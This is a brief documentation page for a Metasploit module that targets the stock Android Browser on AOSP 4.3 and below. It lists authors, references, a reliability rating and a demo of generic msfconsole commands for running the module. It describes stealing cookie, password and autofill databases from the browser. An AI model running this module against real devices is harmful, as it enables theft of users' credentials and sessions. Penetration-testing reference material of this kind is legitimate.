## Android Browser File Theft

This module steals the cookie, password, and autofill 
databases from the Browser application on AOSP 4.3 and 
below.


## Module Name
auxiliary/gather/android_browser_file_theft

## Authors
* Rafay Baloch
* joev


## References
* https://android.googlesource.com/platform/packages/apps/Browser/+/d2391b492dec778452238bc6d9d549d56d41c107%5E%21/#F0
* https://code.google.com/p/chromium/issues/detail?id=90222




## Platforms


## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use auxiliary/gather/android_browser_file_theft
msf auxiliary(android_browser_file_theft) > show targets
   ... a list of targets ...
msf auxiliary(android_browser_file_theft) > set TARGET <target-id>
msf auxiliary(android_browser_file_theft) > show options
   ... show and set options ...
msf auxiliary(android_browser_file_theft) > run
```
    
    